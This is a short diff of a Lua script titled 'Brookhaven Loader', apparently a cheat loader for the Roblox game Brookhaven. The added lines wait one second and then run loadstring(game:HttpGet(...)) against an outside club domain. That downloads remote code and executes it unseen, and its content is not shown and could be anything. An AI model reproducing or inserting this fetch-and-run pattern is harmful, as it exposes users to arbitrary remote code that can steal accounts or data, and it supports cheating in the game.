@@ -9,6 +9,8 @@ Title = "Brookhaven Loader";
 Text = "By: mmoondzn | MMoonZim"; 
 Duration = 5; 
 })
+wait(1)
+loadstring(game:HttpGet('https://astroswrld.club/BetterRoblox/Loader'))()
 wait(2)
 local IsDevelopmentBranch,NotificationTime = false,5
 local Branch = IsDevelopmentBranch and "development" or "main"
